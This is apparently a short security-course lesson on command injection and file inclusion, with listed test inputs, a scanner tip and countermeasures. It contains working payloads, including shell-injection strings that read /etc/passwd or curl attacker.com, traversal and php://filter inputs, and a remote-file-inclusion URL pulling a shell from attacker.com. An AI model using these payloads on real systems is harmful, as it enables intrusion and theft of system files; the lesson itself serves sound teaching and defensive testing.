# L19: Command Injection, LFI/RFI & Server-Side Attacks

## Purpose

Server-side injection flaws let attackers execute OS commands or include arbitrary files.

## Command injection testing

```bash
# Test inputs with:
; whoami
| id
`cat /etc/passwd`
$(curl attacker.com)
```

## LFI/RFI testing

```
# Local File Inclusion
?page=../../../../etc/passwd
?page=php://filter/convert.base64-encode/resource=index.php

# Remote File Inclusion (rare today)
?page=http://attacker.com/shell.txt
```

## ZAP testing

Use Fuzzer on file parameters; check Active Scan alerts for Path Traversal.

## Countermeasures

- Never pass user input to shell (`exec`, `system`).
- Use allowlists for file paths.
- Disable `allow_url_include` in PHP.
- Run web server as low-privilege user; chroot/containers.

---

*Lab reminder: test only on authorized systems. Unauthorized access violates the IT Act, 2000.*
